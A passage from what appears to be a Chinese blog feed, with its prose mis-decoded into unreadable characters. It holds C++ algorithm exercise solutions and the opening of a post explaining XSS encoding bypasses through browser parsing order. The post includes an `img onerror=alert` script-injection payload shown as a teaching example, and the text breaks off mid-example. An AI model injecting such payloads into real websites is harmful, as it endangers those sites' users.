title="Hashçš„åº”ç”¨"></a>Hashçš„åº”ç”¨</h4><p>å½“æ’åºè¶…è¿‡åƒä¸‡çº§åˆ«çš„æ—¶ï¼Œå¯ä»¥ä½¿ç”¨Hashï¼Œè¿™ä¸€ç±»çš„é¢˜ç›®éƒ½æ˜¯åœ¨ä¸€ä¸ªåŒºé—´å†…çš„æ•´æ•°ï¼Œä¸”å„ä¸ç›¸åŒï¼Œå¦‚æœæ¶‰åŠåˆ°è´Ÿæ•°å¯ä»¥ä½¿ç”¨åç§»é‡å»è§£å†³</p><p><img src="https://s2.ax1x.com/2019/09/17/nI0s3R.png" alt="nI0s3R.png" style="zoom: 80%;"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET 500000</span></span><br><span class="line"><span class="keyword">int</span> Hash[<span class="number">1000001</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;m)!=EOF)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">-500000</span>; i &lt;= <span class="number">500000</span>; i++)&#123;</span><br><span class="line">Hash[i + OFFSET] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">Hash[x+OFFSET] += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">500000</span> ; i &gt;= <span class="number">-500000</span>; i--)&#123;</span><br><span class="line"><span class="keyword">if</span>(Hash[i+OFFSET] != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(Hash[i+OFFSET])&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,i);</span><br><span class="line">Hash[i+OFFSET] --;</span><br><span class="line">m--;</span><br><span class="line"><span class="keyword">if</span>(m != <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( m == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ’ç‰ˆé¢˜"><a href="#æ’ç‰ˆé¢˜" class="headerlink" title="æ’ç‰ˆé¢˜"></a>æ’ç‰ˆé¢˜</h4><p>å…³é”®æ˜¯æ¨ç®—å‡ºè¡Œä¹‹é—´çš„å…³ç³»ï¼Œæ¯ä¸€è¡Œå†…å®¹é‡Œé¢çš„å…³ç³»ï¼Œä¸€èˆ¬æœºè¯•è€ƒçš„ä¸å¤š</p><p><img src="https://s2.ax1x.com/2019/09/17/nI0fED.png" alt="nI0fED.png" style="zoom: 67%;"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n)!=EOF)&#123;</span><br><span class="line"><span class="keyword">int</span> Maxline = n + (n - <span class="number">1</span>) *<span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span> ; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span> ; j &lt;= Maxline ; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(j &lt;= Maxline -(n + (i - <span class="number">1</span>) * <span class="number">2</span>))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"*"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æŸ¥æ‰¾ç±»"><a href="#æŸ¥æ‰¾ç±»" class="headerlink" title="æŸ¥æ‰¾ç±»"></a>æŸ¥æ‰¾ç±»</h4><p>æ™®é€šçš„æ•°ç»„éå†ä¸ç”¨è¯´ï¼Œä½†åœ¨å¤æ‚åº¦æå‡çš„æƒ…å†µä¸‹éœ€è¦æ›´é«˜æ•ˆçš„æœç´¢æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦ç»ƒä¹ çš„è¿˜æ˜¯äºŒåˆ†æœç´¢æ³•ï¼Œä½†æˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ä½¿ç”¨äºŒåˆ†æœç´¢éœ€è¦å…ˆè¿›è¡Œæ’åºï¼Œä¸»è¦çš„äºŒåˆ†æœç´¢ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> base= <span class="number">0</span>, top = size;</span><br><span class="line"><span class="keyword">while</span>(base&lt;=top)&#123;</span><br><span class="line"><span class="keyword">int</span> mid = (base+top)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(buff[mid] &lt;= target) base = mid+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> top = mid <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> ans = buff[top];</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/17/nokrBF.png" alt="nokrBF.png" style="zoom:67%;"></p><p><img src="https://s2.ax1x.com/2019/09/17/noACNj.png" alt="noACNj.png" style="zoom: 67%;"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> num[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">char</span> sex[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> Stu &amp;A) <span class="keyword">const</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strcmp</span>(num,A.num)&lt;<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;buff[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> N,M;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;N)!=EOF)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; N ;i ++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s %s %s %d"</span>,buff[i].num,buff[i].name,buff[i].sex,&amp;buff[i].age);</span><br><span class="line">&#125;</span><br><span class="line">sort(buff,buff+N);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;M);</span><br><span class="line"><span class="keyword">char</span> find[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i&lt; M; i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,find);</span><br><span class="line"><span class="keyword">int</span> base = <span class="number">0</span>, top = N<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(base &lt;= top)&#123;</span><br><span class="line"><span class="keyword">int</span> mid = (base+top)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(find,buff[mid].num)==<span class="number">0</span>)&#123;</span><br><span class="line">ans = mid;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(find,buff[mid].num)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">top = mid <span class="number">-1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> base = mid+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(ans == <span class="number">-1</span>) <span class="built_in">printf</span>(<span class="string">"No Answer!\n"</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"%s %s %s %d\n"</span>,buff[ans].num,buff[ans].name,buff[ans].sex,buff[ans].age);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è´ªå¿ƒç±»"><a href="#è´ªå¿ƒç±»" class="headerlink" title="è´ªå¿ƒç±»"></a>è´ªå¿ƒç±»</h4><p>è¿™ç±»é¢˜ç›®çš„ä¸€ä¸ªç‰¹ç‚¹ä¹Ÿæ˜¯éœ€è¦æ’åºï¼Œå¯è§æ’åºçš„é‡è¦æ€§ï¼Œä½†æ˜¯å€¼å¾—æ³¨æ„çš„æ˜¯è´ªå¿ƒå‘å¾—åˆ°çš„ç»“æœä¸ä¸€å®šæ˜¯æœ€ä¼˜è§£ï¼Œå¯èƒ½æ˜¯ä¸€ä¸ªè¿‘ä¼¼çš„æœ€ä¼˜è§£ï¼Œè¿™é‡Œè§åˆ°äº†ä¸¤ç§é¢˜ï¼Œä¸€ç§æ˜¯å›ºå®šé’±æ•°ä¹°æœ€é«˜ä»·æ ¼çš„ä¸œè¥¿ï¼Œå¦ä¸€ç§æ˜¯å›ºå®šæ—¶é—´çœ‹èŠ‚ç›®æ•°æœ€å¤šçš„ï¼Œåæ­£æœ¬è´¨æ˜¯ä¸€æ ·çš„ï¼Œç¬¬ä¸€ä¸ªæ˜¯ä»¥å•ä»·ä½œä¸ºæ’åºæ ‡å‡†ï¼Œç¬¬äºŒä¸ªæ˜¯ä»¥ç»“æŸæ—¶é—´ä½œä¸ºæ’åºæ ‡å‡†</p><p><img src="https://s2.ax1x.com/2019/09/17/noK8Bt.png" alt="noK8Bt.png" style="zoom: 80%;"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">goods</span>&#123;</span></span><br><span class="line"><span class="keyword">double</span> price;</span><br><span class="line"><span class="keyword">double</span> mass;</span><br><span class="line"><span class="keyword">double</span> mass_one;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> goods &amp;A) <span class="keyword">const</span>&#123;</span><br><span class="line"><span class="keyword">return</span> mass_one &gt; A.mass_one;</span><br><span class="line">&#125;</span><br><span class="line">&#125;buff[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">double</span> m;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%lf %d"</span>, &amp;m, &amp;n)!=EOF)&#123;</span><br><span class="line"><span class="keyword">if</span>(m == <span class="number">-1</span> &amp;&amp; n == <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i= <span class="number">0</span> ;i &lt; n; i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf %lf"</span>,&amp;buff[i].mass,&amp;buff[i].price);</span><br><span class="line">buff[i].mass_one = buff[i].mass/buff[i].price;</span><br><span class="line">&#125;</span><br><span class="line">sort(buff,buff+n);</span><br><span class="line"><span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(idx &lt; n &amp;&amp; m &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(m &gt; buff[idx].price)&#123;</span><br><span class="line">ans += buff[idx].mass;</span><br><span class="line">m -= buff[idx].price;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">ans += m*buff[idx].mass_one;</span><br><span class="line">m = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">++idx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.3lf\n"</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>xssç¼–ç ç»•è¿‡åŸç†ä»¥åŠä»ä¸­å­¦ä¹ åˆ°çš„å‡ ä¸ªä¾‹å­</title>
      <link href="/xss-encodeorder.html"/>
      <url>/xss-encodeorder.html</url>
      <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>æœ€è¿‘çœ‹äº†ä¸€äº›xssåˆ©ç”¨æ–¹å¼ï¼Œå‘ç°æœ¬äººåœ¨ä»¥å‰å¯¹ç¼–ç ç»•è¿‡è¿™ä¸€ä¸ªç‚¹çš„åŸç†å¥½åƒæ²¡æœ‰å¤ªæœ¬è´¨æ€§çš„ç†è§£ï¼Œæ‰€ä»¥å°±æœ‰äº†è¿™ç¯‡æ–‡ç« ï¼Œå¯¹æµè§ˆå™¨è¿›è¡Œè§£æçš„é¡ºåºæœ‰ä¸€ä¸ªè®°å½•ï¼Œä¹Ÿä»ä¸­æ”¶è·åˆ°ç‚¹ä¸œè¥¿ï¼Œå‡†å¤‡æ ¡èµ›å‡ºä¸€ä¸ªé¢˜ç›®å…³äºè¿™ä¸ªå†…å®¹<a id="more"></a>XD</p><h3 id="æµè§ˆå™¨æ¶‰åŠåˆ°è§£ææœºåˆ¶"><a href="#æµè§ˆå™¨æ¶‰åŠåˆ°è§£ææœºåˆ¶" class="headerlink" title="æµè§ˆå™¨æ¶‰åŠåˆ°è§£ææœºåˆ¶"></a>æµè§ˆå™¨æ¶‰åŠåˆ°è§£ææœºåˆ¶</h3><p>è°ˆåˆ°è¿™ä¸ªæ˜¯å› ä¸ºè¿™ç¯‡æ–‡ç« çš„æœ¬è´¨æ˜¯æµè§ˆå™¨çš„è§£æç¼–ç çš„é¡ºåºè§¦å‘çš„xssï¼Œè§£æä¸€ç¯‡HTMLæ–‡æ¡£æ—¶ä¸»è¦æœ‰ä¸‰ä¸ªå¤„ç†è¿‡ç¨‹ï¼šHTMLè§£æï¼ŒURLè§£æå’ŒJavaScriptè§£æï¼Œä¸€èˆ¬å…ˆæ˜¯HTMLè§£æï¼Œåé¢ä¸¤ä¸ªè§£æçœ‹æƒ…å†µè€Œå®šï¼ˆå­˜åœ¨äº‹ä»¶çš„æƒ…å†µæœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼‰ï¼Œä½†å¤§å¤šæ•°éƒ½æ˜¯HTMLè§£æ-&gt;URLè§£æ-&gt;JavaScriptè§£æï¼Œokï¼Œé‚£å…ˆæ¥è§£é‡Šä¸€ä¸‹å„ç§è§£ææœºåˆ¶ã€‚å¤§ç¥çº§åˆ«å¯ä»¥è·³è¿‡ï¼Œç›´æ¥çœ‹é‚£å‡ ä¸ªxssä¾‹å­å§ï¼Œæƒ¨~</p><h4 id="HTMLè§£æ"><a href="#HTMLè§£æ" class="headerlink" title="HTMLè§£æ"></a>HTMLè§£æ</h4><p>åœ¨äº†è§£HTMLè§£æçš„å…ˆæ¥äº†è§£ä¸€æ³¢ä»€ä¹ˆæ˜¯HTMLå­—ç¬¦å®ä½“ï¼Œå› ä¸ºHTMLä¸­æœ‰äº›å­—ç¬¦æ˜¯å’Œå…³é”®è¯å†²çªçš„ï¼Œæ¯”å¦‚<code>&lt;ã€&gt;ã€&amp;</code>ï¼Œè§£ç ä¹‹åï¼Œæµè§ˆå™¨ä¼šè¯¯è®¤ä¸ºå®ƒä»¬æ˜¯æ ‡ç­¾ï¼Œè§£å†³çš„åŠæ³•å°±æ˜¯HTMLæºä»£ç ä¸­ä½¿ç”¨å­—ç¬¦å®ä½“ï¼Œæ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„ç©ºæ ¼<code>&amp;nbsp;</code>ï¼Œå­—ç¬¦å®ä½“ä»¥&amp;å¼€å¤´+é¢„å…ˆå®šä¹‰çš„å®ä½“åç§°è¡¨ç¤ºï¼Œ<strong>ä½†ä¸æ˜¯æ‰€æœ‰çš„å­—ç¬¦éƒ½æœ‰å®ä½“åç§°</strong>ï¼Œä½†æ˜¯å®ƒä»¬éƒ½æœ‰å®ä½“ç¼–å·ï¼Œä¹Ÿå¯ä»¥ç”¨&amp;#å¼€å¤´+å®ä½“ç¼–å·+åˆ†å·è¡¨</p><p><img src="https://s2.ax1x.com/2019/09/10/nU30SI.png" alt="nU30SI.png"></p><p>è¦æ˜¯å¯¹phpç†Ÿæ‚‰çš„åŒå­¦ï¼Œå°±ä¼šçŸ¥é“phpä¸­å­˜åœ¨htmlspecialchars()å‡½æ•°å°±æ˜¯å°†ä¸€äº›ä¼šäº§ç”Ÿæ­§ä¹‰çš„ç¬¦å·è½¬ç§»æˆå®ä½“ç¼–å·ï¼Œå¯¹xssèµ·åˆ°äº†é˜²æŠ¤ä½œç”¨ã€‚</p><p>htmlæ˜¯å¦‚ä½•è§£æçš„ï¼Ÿå¯ä»¥çœ‹ä¸€ä¸‹HTMLçš„è¯æ³•è§£æè¿‡ç¨‹<a href="https://html.spec.whatwg.org/multipage/parsing.html" target="_blank" rel="noopener">ä¼ é€é—¨</a>ï¼Œå®˜æ–¹æ˜¯ä»¥çŠ¶æ€æœºè§£é‡Šçš„ï¼Œè¿™é‡Œæˆ‘ç”¨è‡ªå·±çš„è¯æ€»ç»“ä¸€ä¸‹ï¼Œç®€å•çš„è¯´ï¼Œæµè§ˆå™¨åœ¨è§£æä¸€ä¸ªHTMLæ–‡æ¡£æ—¶ï¼Œä¼šæŒ‰ç…§ä»ä¸Šè‡³ä¸‹ï¼Œä»å·¦è‡³å³ä¾æ¬¡è¿›è¡Œè§£æã€‚åœ¨ç¢°åˆ°<code>&lt;</code>æ—¶ï¼Œå°±è¿›å…¥è§£æå…ƒç´ æ ‡ç­¾çš„çŠ¶æ€ï¼Œåé¢è·Ÿç€çš„å†…å®¹è¢«é»˜è®¤æ˜¯æ ‡ç­¾å…ƒç´ å†…çš„å†…å®¹ï¼Œç›´åˆ°ç¢°åˆ°<code>&gt;</code>ç»“æŸã€‚æ‰€ä»¥æˆ‘ä»¬è¦ä½¿<code>&lt;&gt;</code>èƒ½å¤Ÿæ­£å¸¸è¢«å±•ç¤ºçš„è¯ï¼Œå°±å¾—å¯¹å…¶è¿›è¡Œå®ä½“ç¼–ç ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://s2.ax1x.com/2019/09/10/nUa6iT.png" alt="nUa6iT.png"></p><p><img src="https://s2.ax1x.com/2019/09/10/nUaLSe.png" alt="nUaLSe.png"></p><p>å¯¹äºHTMLå­—ç¬¦å®ä½“ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„åªæœ‰æœ‰ä¸‰ç§æƒ…å†µå¯ä»¥å®¹çº³å­—ç¬¦å®ä½“ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸æ˜¯ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨å®ä½“ç¼–ç ï¼Œåªæœ‰åœ¨â€œæ•°æ®çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€ï¼Œâ€œRCDATAçŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€å’Œâ€œå±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€è¿™äº›çŠ¶æ€ä¸­HTMLå­—ç¬¦å®ä½“å°†ä¼šä»â€œ&amp;#â€¦â€å½¢å¼è§£ç ï¼Œå¯¹åº”çš„è§£ç å­—ç¬¦ä¼šè¢«æ”¾å…¥æ•°æ®ç¼“å†²åŒºä¸­ï¼Œæ³¨æ„ç°åœ¨çš„é‡ç‚¹æ”¾åœ¨å“ªé‡Œå¯ä»¥è§£æHTMLç¼–ç ã€‚</p><p>è§£é‡Šä¸€ä¸‹è¿™ä¸‰ç§çŠ¶æ€ï¼Œç¬¬ä¸€ä¸ªï¼Œæ•°æ®çŠ¶æ€å°±ç±»ä¼¼äºåœ¨è§£æä¸€ä¸ªæ ‡ç­¾å†…é‡Œé¢çš„å†…å®¹ï¼Œå¦‚<code>&lt;div&gt;...&lt;/div&gt;</code> å½“æµè§ˆå™¨è§£æå®Œdivæ ‡ç­¾ä¹‹åå¦‚æœæ ‡ç­¾å†…å«æœ‰è½¬ä¹‰å­—ç¬¦çš„è¯ï¼Œå°±ä¼šæœ‰ä¸€ä¸ªå®ä½“ç¼–ç è§£æäº†ï¼Œå¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&amp;#60;img src=x onerror=alert(4)&amp;#62;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºçš„æ˜¯ç»è¿‡è½¬ä¹‰çš„å†…å®¹ï¼Œçœ‹ä¸Šå»æ˜¯ä¸€ä¸ªæ ‡å‡†çš„æ ‡ç­¾è¯­è¨€ï¼Œä½†æ­¤æ—¶ä¸ä¼šè§¦å‘xssï¼Œå› ä¸ºå¤„äºâ€œæ•°æ®çŠ¶æ€â€æ—¶ï¼Œä¸ä¼šè½¬æ¢åˆ°â€œæ ‡ç­¾å¼€å§‹çŠ¶æ€â€ã€‚æ­£å› ä¸ºå¦‚æ­¤ï¼Œå°±ä¸ä¼šå»ºç«‹æ–°æ ‡ç­¾ã€‚å› æ­¤ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨å­—ç¬¦å®ä½“ç¼–ç è¿™ä¸ªè¡Œä¸ºæ¥è½¬ä¹‰ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä»è€Œç¡®ä¿ç”¨æˆ·è¾“å…¥çš„æ•°æ®åªèƒ½è¢«è§£ææˆâ€œæ•°æ®â€ã€‚ä¹Ÿå°±æ˜¯ä¸‹é¢çš„å†…å®¹ï¼Œå°±æ˜¯æ­£å¸¸çš„è½¬ä¹‰æ˜¾ç¤ºï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(4)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è€Œå±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ï¼Œå°±ç±»ä¼¼äºsrcï¼Œherfè¿™æ ·çš„å±æ€§å€¼è¢«ç¼–ç ï¼Œä»–ä¹Ÿæ˜¯ä¼šå…ˆè¿›è¡ŒHtmlè§£ç çš„ï¼Œæ¯”å¦‚ä¸‹é¢çš„è¯­å¥ï¼Œä¼šå…ˆå¯¹é‡Œé¢htmlè§£ç ï¼Œå†ç»§ç»­å¾€ä¸‹æ‰§è¡Œ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>  <span class="attr">href</span>=<span 